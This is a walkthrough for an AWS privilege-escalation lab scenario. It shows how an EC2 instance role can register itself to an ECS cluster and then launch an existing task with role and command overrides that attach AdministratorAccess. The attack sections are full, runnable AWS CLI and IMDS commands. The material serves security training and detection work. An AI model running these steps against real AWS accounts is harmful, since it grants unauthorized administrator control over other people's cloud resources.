# Guided Walkthrough: Privilege Escalation via iam:PassRole + ecs:StartTask + ecs:RegisterContainerInstance

This scenario demonstrates a privilege escalation vulnerability where a principal with `iam:PassRole`, `ecs:StartTask`, and `ecs:RegisterContainerInstance` permissions can escalate to administrator access by registering an unregistered EC2 instance to an ECS cluster and then launching a task with overridden role and command parameters. The key insight is that an ECS-optimized EC2 instance that is not yet registered to any cluster can be remotely reconfigured to join a target cluster, after which the attacker can place arbitrary workloads on it with elevated privileges.

This attack path builds on [research by Tom McLean at Reverse Security](https://labs.reversec.com/posts/2025/08/another-ecs-privilege-escalation-path), which identified that the `ecs:StartTask` API accepts a `taskRoleArn` override that allows the caller to substitute a privileged role at runtime. What makes ECS-007 distinct from other ECS privilege escalation scenarios is the requirement to first register a container instance. Unlike ECS-009 (which assumes a container instance is already registered in the cluster), this scenario starts with an empty cluster and an unregistered EC2 instance. The attacker must bridge this gap by calling `ecs:RegisterContainerInstance` directly using IMDS instance identity documents, causing the instance to join the target cluster. Unlike ECS-005 (which requires `ecs:RegisterTaskDefinition`), no new task definition is created -- the attacker exploits an existing one using `--overrides`.

This scenario is particularly dangerous in environments where EC2 instances with the ECS agent are provisioned but not immediately assigned to clusters, or where broad SSM access is granted. Because the attack does not create a new task definition, traditional detection strategies that focus on `RegisterTaskDefinition` events will miss it. The combination of direct API-based instance registration and ECS task override exploitation represents a realistic and stealthy privilege escalation path that organizations should actively monitor for.

## The Challenge

You start with access to the `pl-prod-ecs-007-to-admin-instance-role` EC2 instance role. In the real world, you'd have obtained this access through initial compromise of the EC2 instance -- perhaps via an SSRF vulnerability in a web application, RCE in a running workload, or credentials discovered in the instance's environment. In the lab, the demo script simulates this RCE access using SSM.

Your goal is to reach the `pl-prod-ecs-007-to-admin-target-role`, which has `AdministratorAccess`. To get there, you need to:

1. Register the EC2 instance to an empty ECS cluster using `ecs:RegisterContainerInstance`
2. Launch an existing task definition on that instance via `ecs:StartTask --overrides`, substituting the task role for the admin role and overriding the container command to attach `AdministratorAccess` to the instance role

The cluster `pl-prod-ecs-007-cluster` exists but is empty. The task definition `pl-prod-ecs-007-existing-task` exists but is benign. Both are waiting to be weaponized.

## Reconnaissance

First, confirm your identity and verify what you're working with:

```bash
# Verify you're operating as the EC2 instance role
aws sts get-caller-identity
```

You should see the instance role ARN: `arn:aws:iam::{account_id}:role/pl-prod-ecs-007-to-admin-instance-role`.

Now verify that you cannot yet perform admin-level actions:

```bash
# This should fail with AccessDenied
aws iam list-users --max-items 1
```

Next, check the ECS cluster state:

```bash
# Confirm the cluster is empty -- no container instances registered yet
aws ecs list-container-instances --cluster pl-prod-ecs-007-cluster
```

The response will show an empty list. There are no container instances, so you cannot start any tasks yet -- `ecs:StartTask` requires a specific container instance ARN to place the task on.

Discover the existing task definition you'll exploit:

```bash
aws ecs list-task-definitions --family-prefix pl-prod-ecs-007-existing-task
```

The key realization here is that you do NOT need `ecs:RegisterTaskDefinition` to create a new definition. You can exploit the existing one by overriding its role and command at launch time via `--overrides`.

## Exploitation

### Step 1: Retrieve IMDS identity documents

The `ecs:RegisterContainerInstance` API authenticates the instance using its cryptographically signed identity document from the Instance Metadata Service (IMDS). Retrieve both the document and its signature:

```bash
IDENTITY_DOC=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/document)
IDENTITY_SIG=$(curl -s http://169.254.169.254/latest/dynamic/instance-identity/signature | tr -d '\n')
TOTAL_CPU=$(($(nproc --all) * 1024))
TOTAL_MEM=$(grep MemTotal /proc/meminfo | awk '{print int($2/1024)}')
```

### Step 2: Call ecs:RegisterContainerInstance directly via API

With the identity documents in hand, call the registration API directly -- no ECS agent restart required for this step:

```bash
CONTAINER_INSTANCE_ARN=$(aws ecs register-container-instance \
    --cluster pl-prod-ecs-007-cluster \
    --instance-identity-document "$IDENTITY_DOC" \
    --instance-identity-document-signature "$IDENTITY_SIG" \
    --total-resources "[{\"name\":\"CPU\",\"type\":\"INTEGER\",\"integerValue\":$TOTAL_CPU},{\"name\":\"MEMORY\",\"type\":\"INTEGER\",\"integerValue\":$TOTAL_MEM}]" \
    --query 'containerInstance.containerInstanceArn' \
    --output text)
```

This registers the EC2 instance to the cluster under your direction, using the instance's own identity credentials. The cluster is no longer empty.

### Step 3: Reconfigure the ECS agent to connect to the cluster

The direct API registration demonstrates the `ecs:RegisterContainerInstance` technique, but for task placement to work, the ECS agent on the instance also needs to connect and provide its full capability attributes (Docker version, OS type, networking mode support, etc.). Reconfigure the agent:

```bash
# Update the ECS agent config to point to the target cluster
sed -i 's/pl-prod-ecs-007-holding/pl-prod-ecs-007-cluster/' /etc/ecs/ecs.config
systemctl restart ecs
```

After the agent restarts, it registers itself with the cluster and begins polling for tasks. Wait for the agent-connected container instance to appear:

```bash
# Wait for the container instance with agentConnected=true
aws ecs describe-container-instances \
    --cluster pl-prod-ecs-007-cluster \
    --container-instances "$CONTAINER_INSTANCE_ARN" \
    --query 'containerInstances[0].agentConnected'
```

### Step 4: Launch the task with overrides

Now for the core exploit. Call `ecs:StartTask` with `--overrides` to substitute the task role and command at runtime:

```bash
OVERRIDES='{
  "taskRoleArn": "arn:aws:iam::{account_id}:role/pl-prod-ecs-007-to-admin-target-role",
  "containerOverrides": [{
    "name": "pl-prod-ecs-007-benign-container",
    "command": [
      "iam", "attach-role-policy",
      "--role-name", "pl-prod-ecs-007-to-admin-instance-role",
      "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
    ]
  }]
}'

TASK_ARN=$(aws ecs start-task \
    --cluster pl-prod-ecs-007-cluster \
    --task-definition pl-prod-ecs-007-existing-task \
    --container-instances "$CONTAINER_INSTANCE_ARN" \
    --overrides "$OVERRIDES" \
    --query 'tasks[0].taskArn' \
    --output text)
```

What just happened: the task launches with `pl-prod-ecs-007-to-admin-target-role` as its task role (the admin role you passed via `iam:PassRole`), and the container runs `aws iam attach-role-policy` with those admin credentials -- attaching `AdministratorAccess` directly to the instance role.

## Verification

Wait for the task to reach `STOPPED` status, then verify the escalation succeeded:

```bash
# Monitor task status
aws ecs describe-tasks \
    --cluster pl-prod-ecs-007-cluster \
    --tasks "$TASK_ARN" \
    --query 'tasks[0].{status:lastStatus,exitCode:containers[0].exitCode}'
```

Once the task stops with exit code 0, allow a few seconds for IAM propagation, then confirm admin access:

```bash
# This should now succeed
aws iam list-users --max-items 3
```

You can also verify the policy attachment directly:

```bash
aws iam list-attached-role-policies \
    --role-name pl-prod-ecs-007-to-admin-instance-role \
    --query 'AttachedPolicies[?PolicyName==`AdministratorAccess`]'
```

## What Happened

You exploited three capabilities working in concert: the ability to register an EC2 instance to an ECS cluster using its own IMDS-signed identity (`ecs:RegisterContainerInstance`), the ability to pass an admin IAM role to an ECS task (`iam:PassRole`), and the ability to override both the task role and container command at launch time (`ecs:StartTask --overrides`). The existing task definition was never modified -- it was merely a vessel for the overrides you injected.

This is distinct from ECS-005 (which creates a new task definition), ECS-008 (which uses Fargate via `ecs:RunTask`), and ECS-009 (which assumes the instance is already registered). ECS-007 is the most realistic scenario for environments with unmanaged ECS-optimized instances -- a common situation when instances are pre-provisioned but not yet assigned to production clusters. Because no task definition is created or modified, detection strategies relying solely on `RegisterTaskDefinition` CloudTrail events will completely miss this attack.
